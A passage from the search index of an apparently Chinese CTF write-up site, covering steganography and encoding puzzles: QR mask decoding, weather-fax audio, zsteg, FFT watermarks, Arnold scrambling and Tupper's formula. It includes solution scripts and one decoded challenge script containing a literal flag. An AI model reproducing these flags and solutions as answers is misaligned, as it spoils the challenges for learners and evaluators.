5 100000011001110 M 6 100111110010111 M 7 100101010100000 Q 0 011010101011111 Q 1 011000001101000 Q 2 011111100110001 Q 3 011101000000110 Q 4 010010010110100 Q 5 010000110000011 Q 6 010111011011010 Q 7 010101111101101 H 0 001011010001001 H 1 001001110111110 H 2 001110011100111 H 3 001100111010000 H 4 000011101100010 H 5 000001001010101 H 6 000110100001100 H 7 000100000111011 <p>QR \u63a9\u7801\u8bf4\u660e</p> Mask Number If the formula below is true for a given row/column coordinate, switch the bit at that coordinate 0 (row + column) mod 2 == 0 1 (row) mod 2 == 0 2 (column) mod 3 == 0 3 (row + column) mod 3 == 0 4 ( floor(row / 2) + floor(column / 3) ) mod 2 == 0 5 ((row * column) mod 2) + ((row * column) mod 3) == 0 6 ( ((row * column) mod 2) + ((row * column) mod 3) ) mod 2 == 0 7 ( ((row + column) mod 2) + ((row * column) mod 3) ) mod 2 == 0 <p>\u53c2\u8003\u4e0a\u9762\u7684\u8868\u683c</p> <p>\u63a9\u7801\u7f16\u53f7 1 \u5177\u6709\u516c\u5f0f<code>(row) mod 2 == 0</code></p> <p>\u8bf7\u6ce8\u610f\u884c\u53f7\u4ece 0 \u5f00\u59cb\uff0c\u56e0\u6b64\u6211\u4eec\u5fc5\u987b\u4ea4\u6362\u5750\u6807\u4e3a 0\u30012\u30014\u3001\u2026\u300128 \u7684\u884c\u7684\u4f4d</p> <p>\u53e6\u5916\uff0cQR \u7801\u6709\u56fa\u5b9a\u7684\u6a21\u5f0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u5207\u6362\u6570\u636e\u90e8\u5206\u7684\u4f4d</p> <p>\u53c2\u8003\u4e0b\u9762\u6570\u636e\u533a\u57df\u548c\u4f4d\u987a\u5e8f</p> <p></p> <p>\u56e0\u6b64\uff0c\u539f\u59cb\u7684 D1\u2013D26 \u4e3a\uff1a</p> <pre><code>D1  = 0b11101100\nD14 = 0b10000010\nD2  = 0b11111000\nD15 = 0b10010101\nD3  = 0b00110110\nD16 = 0b00111101\nD4  = 0b01110110\nD17 = 0b01100010\nD5  = 0b00100010\nD18 = 0b11101001\nD6  = 0b11110001\nD19 = 0b10100001\nD7  = 0b00110111\nD20 = 0b11100101\nD8  = 0b01010010\nD21 = 0b11010101\nD9  = 0b00010111\nD22 = 0b00101101\nD10 = 0b11011110\nD23 = 0b10010111\nD11 = 0b01000100\nD24 = 0b10001011\nD12 = 0b01010100\nD25 = 0b01111000\nD13 = 0b11001101\nD26 = 0b11000110\n</code></pre> <p>mod 2 == 0 \u63a9\u7801\u4e4b\u540e</p> <pre><code>D1  = 0b00100000\nD14 = 0b01001110\nD2  = 0b00110100\nD15 = 0b01011001\nD3  = 0b11111010\nD16 = 0b00001110\nD4  = 0b01000101\nD17 = 0b01010001\nD5  = 0b00010001\nD18 = 0b11011010\nD6  = 0b00111101\nD19 = 0b10010010\nD7  = 0b00000100\nD20 = 0b11010101\nD8  = 0b10011110\nD21 = 0b00011001\nD9  = 0b11010100\nD22 = 0b00010001\nD10 = 0b00010100\nD23 = 0b00001110\nD11 = 0b11011101\nD24 = 0b00010010\nD12 = 0b11010010\nD25 = 0b00011111\nD13 = 0b01010100\nD26 = 0b01000000\n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u89e3\u7801\u6570\u636e\u4e86</p> <p>\u6709\u89e3\u7801\u7684\u6a21\u5f0f\u6307\u793a\u5668\uff1a</p> <ul> <li><code>0001</code>\uff1a\u6570\u5b57\u6a21\u5f0f\uff08\u6bcf 3 \u4f4d 10 \u4f4d\uff09</li> <li><code>0010</code>\uff1a\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\uff08\u6bcf 2 \u4e2a\u5b57\u7b26 11 \u4f4d\uff09</li> <li><code>0100</code>\uff1a\u5b57\u8282\u6a21\u5f0f\uff08\u6bcf\u4e2a\u5b57\u7b26 8 \u4f4d\uff09</li> <li><code>1000</code>\uff1a\u6c49\u5b57\u6a21\u5f0f\uff08\u6bcf\u4e2a\u5b57\u7b26 13 \u4f4d\uff09</li> <li><code>0111</code>\uff1aECI \u6a21\u5f0f</li> </ul> <p>\u5b57\u7b26\u6570\u6307\u793a\u7b26\u8ddf\u5728\u6a21\u5f0f\u6307\u793a\u7b26\u4e4b\u540e\u3002</p> <ul> <li>\u7248\u672c 1\u20139</li> <li>\u6570\u5b57\u6a21\u5f0f\uff1a10\u4f4d</li> <li>\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\uff1a9 \u4f4d</li> <li>\u5b57\u8282\u6a21\u5f0f\uff1a8\u4f4d</li> <li>\u6c49\u5b57\u6a21\u5f0f\uff1a8\u4f4d</li> <li>\u7248\u672c 10\u201326</li> <li>\u6570\u5b57\u6a21\u5f0f\uff1a12\u4f4d</li> <li>\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\uff1a11 \u4f4d</li> <li>\u5b57\u8282\u6a21\u5f0f\uff1a16\u4f4d</li> <li>\u6c49\u5b57\u6a21\u5f0f\uff1a10\u4f4d</li> <li>\u7248\u672c 27\u201340</li> <li>\u6570\u5b57\u6a21\u5f0f\uff1a14\u4f4d</li> <li>\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\uff1a13 \u4f4d</li> <li>\u5b57\u8282\u6a21\u5f0f\uff1a16\u4f4d</li> <li>\u6c49\u5b57\u6a21\u5f0f\uff1a12\u4f4d</li> </ul> <p>\u67e5\u770b\u6bcf\u79cd\u6a21\u5f0f\u7684\u7f16\u7801\u8fc7\u7a0b\uff1a</p> <ul> <li>\u6570\u5b57\u6a21\u5f0f\u7f16\u7801</li> <li>\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u7f16\u7801</li> <li>\u5b57\u8282\u6a21\u5f0f\u7f16\u7801</li> <li>\u6c49\u5b57\u6a21\u5f0f\u7f16\u7801</li> </ul> <p>\u8ba9\u6211\u4eec\u4ece\u4e0a\u9762\u7684\u6570\u636e D1\u2013D26 \u5f00\u59cb\uff1a</p> <pre><code>data = '00100000' \\\n       '00110100' \\\n       '11111010' \\\n       '01000101' \\\n       '00010001' \\\n       '00111101' \\\n       '00000100' \\\n       '10011110' \\\n       '11010100' \\\n       '00010100' \\\n       '11011101' \\\n       '11010010' \\\n       '01010100' \\\n       '01001110' \\\n       '01011001' \\\n       '00001110' \\\n       '01010001' \\\n       '11011010' \\\n       '10010010' \\\n       '11010101' \\\n       '00011001' \\\n       '00010001' \\\n       '00001110' \\\n       '00010010' \\\n       '00011111' \\\n       '01000000'\nalphanumeric = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ $%*+-./:'.chars\n\ndef read(str, size)\n  str.slice!(0, size)\nend\n\ndef kanji(num)\n  if num &gt;= 0x1740\n    (0xC140 + num / 0xC0 * 0x100 + num % 0xC0)\n      .chr(Encoding::Shift_JIS).encode(Encoding::UTF_8)\n  else\n    (0x8140 + num / 0xC0 * 0x100 + num % 0xC0)\n      .chr(Encoding::Shift_JIS).encode(Encoding::UTF_8)\n  end\nend\n\nloop do\n  case mode = read(data, 4)\n  when '0010' # Alphanumeric\n    count = read(data, 9).to_i(2)\n    (count / 2).times do\n      chunk = read(data, 11).to_i(2)\n      print alphanumeric[chunk / 45] + alphanumeric[chunk % 45]\n    end\n    print alphanumeric[read(data, 11).to_i(2)] if count.odd?\n  when '0100' # Byte\n    count = read(data, 8).to_i(2)\n    count.times do\n      print read(data, 8).to_i(2).chr\n    end\n  when '1000' # Kanji\n    count = read(data, 8).to_i(2)\n    count.times do\n      print kanji(read(data, 13).to_i(2))\n    end\n  when '0000' # Terminate\n    break\n  else\n    fail \"Unhandled mode #{mode}\"\n  end\nend\n</code></pre>"},{"location":"Misc/Chapter2/2-39/","title":"OGG/WAV \u5355\u8272\u56fe\u50cf\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-39/#oggwav-\u5355\u8272\u56fe\u50cf\u9690\u5199","title":"OGG/WAV \u5355\u8272\u56fe\u50cf\u9690\u5199","text":"<p>\u201c120 LPM\u201d\u63d0\u793a\u6307\u7684\u662f\u5929\u6c14\u4f20\u771f\uff0c\u4e00\u79cd\u4f20\u8f93\u5355\u8272\u56fe\u50cf\u7684\u6a21\u62df\u6a21\u5f0f</p> <p>\u6709\u4e00\u4e2a\u540d\u4e3a Multimode \u7684 OS X \u5e94\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u5c06\u97f3\u9891\u8f6c\u6362\u56de\u539f\u59cb\u4f20\u771f\u56fe\u50cf</p> <p>\u4f46\u5b83\u53ea\u63a5\u53d7 WAV \u6587\u4ef6\u4f5c\u4e3a\u8f93\u5165\uff0c\u6240\u4ee5\u6211\u9996\u5148\u8f6c\u6362 <code>similar.ogg</code> \u4e3a <code>similar.wav</code> \u4f7f\u7528 Audacity</p> <p></p> <p>\u6b63\u6587\u5982\u4e0b\uff1a</p> <pre><code>section 1 of 1 of file rfax_man\nbegin 644 rfax_man\nh5sg60BSxwp62+57aMLVTPK3i9b-t+5pGLKyPA-FxxuysvFs+BT8+o0dVsM24\nhcZHRaWYEHRBGFGtqk-cMV7oqqQRzbobGRB9Kwc-pTHzCDSSMJorR8d-pxdqd\nhLWpvQWRv-N33mFwEicqz+UFkDYsbDvrfOC7tko5g1JrrSX0swhn64neLsohr\nh26K1mSxnS+TF1Cta8GHHQ-t1Cfp7nh-oZeFuVi5MEynqyzX8kMtXcAynSLQx\nhg4o56Pu4YUZHMqDGtczKeCwXU8PZEc4lY0FbDfFfgZpJFC-a-sHGLtGJgCMZ\nhksr6XNTedEUdVJqxOO5VaReoH68eEPJ2m6d9mKhlhVE7zw4Yru4DUWRCJH28\nhyeth+l2I0gPnEfrTLwAc+-TPS0YKYY3K0np58gVPgdAN8RY7+rQfRDin9JSa\nhPG32WG7-rTl3uthvrnDO-wD09GDIRCniuoefs8UsfiWZOLq+0awOrQxAPM+C\nhxLwOJ9VUKwdn7dJduLn1KhBucvL1pr5lGiBFfUbL79cFFex+G27kT+fsQ7X5\nh87mgPivWhDSQHKPXqpKGniDkYsIYpg66ZWbHp4PfcgtPukElDWENlQPSuNAQ\nhnboE4Bd8kyyokt67GgfGvBVS45sMFPtlgKRlG-QPFSgbMHujA3qYemxnuqGx\nhp97aXpdKpvAE8zx-oUzazoVFz32X3OxAuiWJhKEjaYKpM7f95yv1S62v+k++\n+\nend\nsum \u2014r/size 7468/769 section (from \"begin\" to \"end\")\nsum \u2014r/size 36513/540 entire input file\n</code></pre> <p>\u4f7f\u7528 XXdecoder \u89e3\u7801\u751f\u6210\u4e00\u4e2a\u540d\u4e3a \u7684\u6587\u4ef6 <code>rfax_man</code></p> <p></p> <pre><code>$ file rfax_man\nrfax_man: gzip compressed data, was \"rfax_man.py\", from FAT filesystem (MS-DOS, OS/2, NT), last modified: Thu Feb  6 17:52:39 2014, max speed\n</code></pre> <p>\u89e3\u538b\u7f29\u662f\u4e00\u4e2a Python \u811a\u672c</p> <pre><code>import socket,os,sys,hashlib\n\nKEY  = \"CTF{4BDF4498E4922B88642D4915C528DA8F}\" # DO NOT SHARE THIS!\nHOST = '109.233.61.11'\nPORT = 8001\n\nif len(sys.argv)&lt;3:\n  print 'Usage: rfax_man.py add|del file.png'\n  print '\\nAdd your pictures to transmission!\\nSizes: 800&lt;=width&lt;=3200 and height/width &lt;= 2.0.\\nUse contrast grayscale pictures.'\n  sys.exit(0)\n\ndata=open(sys.argv[2],'rb').read(1000000)\n\nm=hashlib.md5(); m.update(KEY); KEYH=m.hexdigest().upper()\nm=hashlib.md5(); m.update(data); h=m.hexdigest().upper()\nprint 'File hash',h\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\nprint 'Connected.'\n\nif sys.argv[1]=='add':\n  s.sendall(KEYH+':ADD:'+data)\n  s.shutdown(socket.SHUT_WR)\n  print s.recv(1024)\nelif sys.argv[1]=='del':\n  s.sendall(KEYH+':DEL:'+h)\n  print s.recv(1024)\n\ns.close()\nprint 'Done.'\n</code></pre>"},{"location":"Misc/Chapter2/2-4/","title":"ZSteg \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-4/#zsteg-\u9690\u5199","title":"ZSteg \u9690\u5199","text":"<p>\u8fd9\u662f\u6700\u5e38\u89c1\u7684\u9690\u5199\u65b9\u6cd5</p> <p>\u901a\u8fc7\u4fee\u6539\u56fe\u50cf\u50cf\u7d20\u503c\u7684\u6709\u6548\u4f4d\u6765\u5d4c\u5165\u4fe1\u606f </p> <p>\u62ff\u5230\u56fe\u7247\u540e\u5148\u7528 Zsteg \u63d0\u53d6\uff0c\u6bd4 Stegsolve \u66f4\u5feb</p> <p></p> <p>\u62a5\u9519\u4e86\u662f\u56e0\u4e3a\u9ed8\u8ba4\u4ece\u6700\u4f4e\u6709\u6548\u4f4d\u5f00\u59cb\uff0c\u53ef\u4ee5\u52a0\u4e0a --msb \u4ece\u6700\u9ad8\u6709\u6548\u4f4d\u5f00\u59cb\u63d0\u53d6</p> <p></p>"},{"location":"Misc/Chapter2/2-40/","title":"\u5085\u91cc\u53f6\u76f2\u6c34\u5370\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-40/#\u5085\u91cc\u53f6\u76f2\u6c34\u5370\u9690\u5199","title":"\u5085\u91cc\u53f6\u76f2\u6c34\u5370\u9690\u5199","text":"<p>\u7ee7\u4e0a\u4e00\u8282\u4f2a\u52a0\u5bc6\u540e\u62ff\u5230\u56fe\u7247</p> <p></p> <p>\u538b\u7f29\u5305\u7684\u540d\u79f0\u4e3a FFT\uff0c\u660e\u663e\u7684\u5085\u53f6\u91cc\u53d8\u6362</p> <p>\u57fa\u672c\u539f\u7406</p> <ol> <li>\u5085\u91cc\u53f6\u53d8\u6362\uff1a\u5c06\u539f\u59cb\u56fe\u50cf\u8fdb\u884c\u4e8c\u7ef4\u79bb\u6563\u5085\u91cc\u53f6\u53d8\u6362\uff08DFT\uff09\uff0c\u5f97\u5230\u9891\u57df\u8868\u793a\u3002\u9891\u57df\u56fe\u50cf\u7684\u6bcf\u4e2a\u70b9\u5305\u542b\u5e45\u5ea6\u548c\u76f8\u4f4d\u4fe1\u606f\uff0c\u5206\u522b\u4ee3\u8868\u56fe\u50cf\u4e2d\u4e0d\u540c\u9891\u7387\u6210\u5206\u7684\u5f3a\u5ea6\u548c\u4f4d\u7f6e</li> <li>\u6c34\u5370\u5d4c\u5165\uff1a\u9009\u62e9\u9891\u57df\u4e2d\u7684\u7279\u5b9a\u533a\u57df\uff08\u901a\u5e38\u662f\u4e2d\u9891\u533a\u57df\uff09\u5d4c\u5165\u6c34\u5370\u4fe1\u606f\u3002\u4e3a\u4e86\u4fdd\u6301\u9891\u8c31\u7684\u5bf9\u79f0\u6027\uff0c\u901a\u5e38\u4f1a\u5c06\u6c34\u5370\u5bf9\u79f0\u5730\u5d4c\u5165\u9891\u57df\u7684\u4e24\u4e2a\u533a\u57df\u3002\u5d4c\u5165\u65b9\u5f0f\u53ef\u4ee5\u662f\u76f4\u63a5\u4fee\u6539\u5e45\u5ea6\u503c\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u76f8\u4f4d\u8c03\u5236\u7b49\u65b9\u6cd5</li> <li>\u5085\u91cc\u53f6\u9006\u53d8\u6362\uff1a\u5c06\u5d4c\u5165\u6c34\u5370\u540e\u7684\u9891\u57df\u56fe\u50cf\u8fdb\u884c\u5085\u91cc\u53f6\u9006\u53d8\u6362\uff0c\u5f97\u5230\u542b\u6709\u6c34\u5370\u7684\u7a7a\u95f4\u57df\u56fe\u50cf\u3002\u7531\u4e8e\u6c34\u5370\u5d4c\u5165\u5728\u9891\u57df\u4e2d\uff0c\u7a7a\u95f4\u57df\u56fe\u50cf\u7684\u89c6\u89c9\u8d28\u91cf\u53d8\u5316\u8f83\u5c0f\uff0c\u96be\u4ee5\u88ab\u5bdf\u89c9</li> <li>\u6c34\u5370\u63d0\u53d6\uff1a\u5728\u4e0d\u9700\u8981\u539f\u59cb\u56fe\u50cf\u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u542b\u6c34\u5370\u56fe\u50cf\u8fdb\u884c\u5085\u91cc\u53f6\u53d8\u6362\uff0c\u63d0\u53d6\u9891\u57df\u4e2d\u7684\u6c34\u5370\u4fe1\u606f\u3002\u8fd9\u5c31\u662f\u201c\u76f2\u201d\u6c34\u5370\u7684\u542b\u4e49\uff0c\u5373\u63d0\u53d6\u6c34\u5370\u65f6\u4e0d\u4f9d\u8d56\u539f\u59cb\u56fe\u50cf</li> </ol> <p>\u4e0a\u811a\u672c</p> <pre><code>import cv2 as cv\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nimg = cv.imread('FFT.png', 0)       # \u76f4\u63a5\u8bfb\u4e3a\u7070\u5ea6\u56fe\u50cf\uff0c\u4e0d\u8fc7\u6b64\u9898\u5df2\u7ecf\u662f\u7070\u5ea6\u56fe\u7247\u4e86\nf = np.fft.fft2(img)                # \u505a\u9891\u7387\u53d8\u6362\nfshift = np.fft.fftshift(f)         # \u8f6c\u79fb\u50cf\u7d20\u505a\u5e45\u5ea6\u8c31\ns1 = np.log(np.abs(fshift))         # \u53d6\u7edd\u5bf9\u503c\uff1a\u5c06\u590d\u6570\u53d8\u5316\u6210\u5b9e\u6570\u53d6\u5bf9\u6570\u7684\u76ee\u7684\u4e3a\u4e86\u5c06\u6570\u636e\u53d8\u5316\u5230 0-255\nplt.subplot(121)\nplt.imshow(img, 'gray')\nplt.title('original')\nplt.subplot(122)\nplt.imshow(s1,'gray')\nplt.title('center')\nplt.show()\n</code></pre> <p></p>"},{"location":"Misc/Chapter2/2-41/","title":"\u9690\u5199\u6c34\u5370\u5de5\u5177\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-41/#\u9690\u5199\u6c34\u5370\u5de5\u5177\u9690\u5199","title":"\u9690\u5199\u6c34\u5370\u5de5\u5177\u9690\u5199","text":"<p>\u7ee7\u4e0a\u4e00\u8282\u4f2a\u52a0\u5bc6\u540e\u62ff\u5230\u56fe\u7247</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177\u63d0\u53d6\u6c34\u5370</p> <p></p>"},{"location":"Misc/Chapter2/2-42/","title":"Arnold \u52a0\u5bc6\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-42/#arnold-\u52a0\u5bc6\u9690\u5199","title":"Arnold \u52a0\u5bc6\u9690\u5199","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u7ed9\u4e86\u4e0d\u77e5\u9053\u4ec0\u4e48\u4e1c\u4e1c\u7684\u56fe\u7247</p> <p></p> <p>\u63d0\u53d6\u56fe\u7247\u4e0a\u7684\u5b57</p> <pre><code>61726e6f6c64\n</code></pre> <p>\u8f6c ASCII \u7801\u5f97\u5230</p> <pre><code>arnold\n</code></pre> <p>Arnold \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u57fa\u4e8e\u56fe\u50cf\u7f6e\u4e71\u7684\u52a0\u5bc6\u65b9\u6cd5\uff0c\u4e5f\u79f0\u4e3a Arnold \u53d8\u6362\u6216\u732b\u8138\u53d8\u6362</p> <p>\uff08\u521a\u597d\u4e0e\u9898\u76ee\u63cf\u8ff0\u76f8\u547c\u5e94\u4e86\uff09</p> <p>Arnold \u53d8\u6362\u662f\u4e00\u79cd\u4e8c\u7ef4\u7684\u53ef\u9006\u6620\u5c04\uff0c\u5b83\u5c06\u56fe\u50cf\u4e2d\u7684\u50cf\u7d20\u70b9\u4ece\u4f4d\u7f6e (x,y) \u6620\u5c04\u5230\u65b0\u7684\u4f4d\u7f6e (x',y')\u3002\u5176\u6570\u5b66\u8868\u8fbe\u5f0f\u4e3a\uff1a</p> <pre><code>[x']   [1 1][x]      mod N\n[y'] = [1 2][y] \n</code></pre> <p>\u5176\u4e2d N \u662f\u56fe\u50cf\u7684\u5927\u5c0f\uff08\u5047\u8bbe\u56fe\u50cf\u4e3a N\u00d7N \u7684\u6b63\u65b9\u5f62\uff09</p> <p>\u5c55\u5f00\u540e\u7684\u516c\u5f0f\u4e3a\uff1a</p> <pre><code>x' = (x + y) mod N\ny' = (x + 2y) mod N\n</code></pre> <p>\u52a0\u5bc6\u8fc7\u7a0b\uff1a</p> <ol> <li>\u8bfb\u53d6 N\u00d7N \u7684\u539f\u59cb\u56fe\u50cf</li> <li>\u5bf9\u6bcf\u4e2a\u50cf\u7d20\u70b9 (x,y)\uff0c\u8ba1\u7b97\u65b0\u7684\u4f4d\u7f6e (x',y')\uff1a</li> <li>x' = (x + y) mod N</li> <li>y' = (x + 2y) mod N</li> <li>\u5c06\u50cf\u7d20\u79fb\u52a8\u5230\u65b0\u4f4d\u7f6e</li> <li>\u53ef\u4ee5\u91cd\u590d\u591a\u6b21\u53d8\u6362\u4ee5\u589e\u5f3a\u52a0\u5bc6\u6548\u679c</li> </ol> <p>\u89e3\u5bc6\u8fc7\u7a0b\uff1a</p> <ol> <li>\u8ba1\u7b97\u53d8\u6362\u77e9\u9635\u7684\u9006\u77e9\u9635\uff1a</li> </ol> <pre><code>[x]   [ 2 -1][x']      mod N\n[y] = [-1  1][y'] \n</code></pre> <ol> <li> <p>\u5bf9\u52a0\u5bc6\u56fe\u50cf\u4e2d\u7684\u6bcf\u4e2a\u50cf\u7d20\u70b9 (x',y')\uff0c\u8ba1\u7b97\u539f\u59cb\u4f4d\u7f6e (x,y)\uff1a</p> </li> <li> <p>x = (2x' - y') mod N</p> </li> <li> <p>y = (-x' + y') mod N</p> </li> <li> <p>\u5c06\u50cf\u7d20\u79fb\u56de\u539f\u59cb\u4f4d\u7f6e</p> </li> <li> <p>\u91cd\u590d\u4e0e\u52a0\u5bc6\u76f8\u540c\u6b21\u6570\u7684\u53d8\u6362</p> </li> </ol> <p>\u7f16\u5199\u811a\u672c\uff1a</p> <pre><code>import cv2\nimport numpy as np\nimport matplotlib.image as mpimg\n\ndef arnold_decode(imgfile, outfile, shuffle_times, a, b):\n    image= cv2.imread(imgfile)\n    decode_image = np.zeros(image.shape, np.uint8)\n    h, w = image.shape[0], image.shape[1]\n    N = h\n    for time in range(shuffle_times):\n        for ori_x in range(h):\n            for ori_y in range(w):\n                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N\n                new_y = ((-a) * ori_x + ori_y) % N\n                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]\n\n    cv2.imwrite(outfile, decode_image)\n    print(\"\u5f97\u5230\u56fe\u7247\uff1a\" + outfile)\n\narnold_decode(\"girlfriend.png\",\"girlfriend.png\",0x61,0x726e,0x6f6c64)\n</code></pre> <p></p>"},{"location":"Misc/Chapter2/2-43/","title":"Tupper \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-43/#tupper-\u9690\u5199","title":"Tupper \u9690\u5199","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u7ed9\u51fa\u4e86\u5f88\u591a\u56fe\u7247</p> <p></p> <p>\u7528\u811a\u672c\u8bc6\u522b\u51fa\u6765</p> <pre><code>import ddddocr\n\nocr = ddddocr.DdddOcr()\n\nfor i in range(0,136):\n     with open('{}.png'.format(i), 'rb') as f:\n          img_bytes = f.read()\n          tmp = ocr.classification(img_bytes).replace('o','0')\n          print(\"\".join(list(tmp)), end='')\n</code></pre> <p>\u67e5\u770b\u63d0\u793a\u7ed9\u51fa\u4e86 Tupper</p> <p></p> <p>Jeff Tupper \u7684\u81ea\u5f15\u7528\u516c\u5f0f\uff08Tupper's self-referential formula\uff09\u662f 2001 \u5e74\u63d0\u51fa\u7684\u4e00\u4e2a\u8457\u540d\u6570\u5b66\u516c\u5f0f\uff0c\u5b83\u5728\u7279\u5b9a\u6761\u4ef6\u4e0b\u7ed8\u5236\u51fa\u7684\u56fe\u5f62\u5c31\u662f\u516c\u5f0f\u672c\u8eab</p> <p>\u8fd9\u4e2a\u516c\u5f0f\u5c55\u793a\u4e86\u6570\u5b66\u4e0e\u8ba1\u7b97\u673a\u56fe\u5f62\u7684\u5947\u5999\u8054\u7cfb\uff0c\u5177\u6709\u4ee5\u4e0b\u7279\u70b9</p> <p>\u539f\u59cb\u4e0d\u7b49\u5f0f\u5f62\u5f0f\u4e3a\uff1a</p> <pre><code>1/2 &lt; \u230amod(\u230ay/17\u230b\u00d72^(-17x-mod(y,17)),2)\u230b\n</code></pre> <p>\u5176\u4e2d\uff1a</p> <ul> <li>\u230a\u00b7\u230b \u8868\u793a\u5411\u4e0b\u53d6\u6574\u51fd\u6570</li> <li>mod \u8868\u793a\u53d6\u6a21\u8fd0\u7b97</li> <li>x \u548c y \u662f\u5750\u6807\u53d8\u91cf</li> </ul> <p>\u57fa\u672c\u673a\u5236\uff1a</p> <ul> <li>\u516c\u5f0f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u4f4d\u56fe\u7f16\u7801\u7cfb\u7edf\uff0c\u53ef\u4ee5\u5c06\u4efb\u4f55 106 \u50cf\u7d20\u5bbd \u00d7 17 \u50cf\u7d20\u9ad8\u7684\u4e8c\u503c\u56fe\u50cf\u7f16\u7801\u4e3a\u4e00\u4e2a\u8d85\u5927\u6574\u6570 k</li> <li>\u5f53\u5728 0 \u2264 x &lt; 106 \u548c k \u2264 y &lt; k+17 \u7684\u8303\u56f4\u5185\u7ed8\u5236\u6ee1\u8db3\u4e0d\u7b49\u5f0f\u7684\u70b9\u65f6\uff0c\u5c31\u4f1a\u91cd\u73b0\u7f16\u7801\u7684\u56fe\u50cf</li> <li>\u795e\u5947\u7684\u662f\uff0c\u5f53 k \u53d6\u7279\u5b9a\u503c\u65f6\uff0c\u7ed8\u5236\u51fa\u7684\u56fe\u50cf\u5c31\u662f\u516c\u5f0f\u672c\u8eab\u7684\u4e0d\u7b49\u5f0f\u5f62\u5f0f</li> </ul> <p>\u7f16\u7801\u539f\u7406\uff1a</p> <ol> <li>\u50cf\u7d20\u7f51\u683c\uff1a\u5c06\u56fe\u50cf\u89c6\u4e3a 17 \u884c(\u9ad8) \u00d7 106 \u5217(\u5bbd)\u7684\u7f51\u683c</li> <li>\u4e8c\u8fdb\u5236\u7f16\u7801\uff1a</li> <li>\u6bcf\u5217 17 \u4e2a\u50cf\u7d20\u53ef\u4ee5\u770b\u4f5c 17 \u4f4d\u4e8c\u8fdb\u5236\u6570\uff08\u4ece\u4e0b\u5230\u4e0a\uff09</li> <li>\u5c06 106 \u5217\u8fd9\u6837\u7684 17 \u4f4d\u6570\u8fde\u63a5\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u8d85\u957f\u7684\u4e8c\u8fdb\u5236\u6570</li> <li>\u8f6c\u6362\u4e3a\u5341\u8fdb\u5236\uff1a\u5c06\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6570\u8f6c\u6362\u4e3a\u5341\u8fdb\u5236\uff0c\u5c31\u5f97\u5230\u4e86 k \u503c</li> </ol> <p>\u89e3\u7801\u8fc7\u7a0b\uff08\u5373\u7ed8\u56fe\u8fc7\u7a0b\uff09\uff1a</p> <ol> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u50cf\u7d20\u4f4d\u7f6e (x,y)\uff08x\u2208[0,105], y\u2208[k,k+16]\uff09</li> <li>\u8ba1\u7b97<code>v = \u230ay/17\u230b \u00d7 2^(-17x - mod(y,17))</code></li> <li>\u5224\u65ad mod(v,2) \u662f\u5426\u5927\u4e8e \u00bd</li> <li>\u5982\u679c\u6ee1\u8db3\uff0c\u5219\u5728 (x,y-k) \u4f4d\u7f6e\u7ed8\u5236\u4e00\u4e2a\u70b9</li> </ol> <p>\u4e0a\u811a\u672c</p> <pre><code>import numpy as np\nimport matplotlib.pyplot as plt\n\n\ndef Tupper_self_referential_formula(k):\n    aa = np.zeros((17, 106))\n\n    def f(x, y):\n        y += k\n        a1 = 2 ** -(-17 * x - y % 17)\n        a2 = (y // 17) // a1\n        return 1 if a2 % 2 &gt; 0.5 else 0\n\n    for y in range(17):\n        for x in range(106):\n            aa[y, x] = f(x, y)\n\n    return aa[:, ::-1]\n\n\nk = 1594199391770250354455183081054802631580554590456781276981302978243348088576774816981145460077422136047780972200375212293357383685099969525103172039042888918139627966684645793042724447954308373948403404873262837470923601139156304668538304057819343713500158029312192443296076902692735780417298059011568971988619463802818660736654049870484193411780158317168232187100668526865378478661078082009408188033574841574337151898932291631715135266804518790328831268881702387643369637508117317249879868707531954723945940226278368605203277838681081840279552\naa = Tupper_self_referential_formula(k)\nplt.figure(figsize=(15, 10))\nplt.imshow(aa, origin='lower')\nplt.gca().invert_xaxis() # \u8fd9\u91cc\u53d1\u73b0\u56fe\u50cf\u662f\u5012\u7740\u7684\uff0c\u9700\u8981\u53cd\u8f6c\nplt.show()\n</code></pre>"},{"location":"Misc/Chapter2/2-44/","title":"Strings \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-44/#strings-\u9690\u5199","title":"Strings \u9690\u5199","text":"<p>\u6253\u5361\u94fe\u63a5\u4e0b\u8f7d\u56fe\u7247</p> <p></p> <p>\u76f4\u63a5\u63d0\u53d6\u6709\u5173 flag \u7684\u5b57\u7b26\u4e32\u62ff\u5230 flag</p> <pre><code>strings '/home/morant/95f6edfb66ef42d774a5a34581f19052.jpg' | grep \"flag\"\n</code></pre> <p></p>"},{"location":"Misc/Chapter2/2-45/","title":"\u5854\u73c0\u81ea\u6307\u516c\u5f0f\uff08Tupper's self-referential formula\uff09\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-45/#\u5854\u73c0\u81ea\u6307\u516c\u5f0ftuppers-self-referential-formula\u9690\u5199","title":"\u5854\u73c0\u81ea\u6307\u516c\u5f0f\uff08Tupper's self-referential 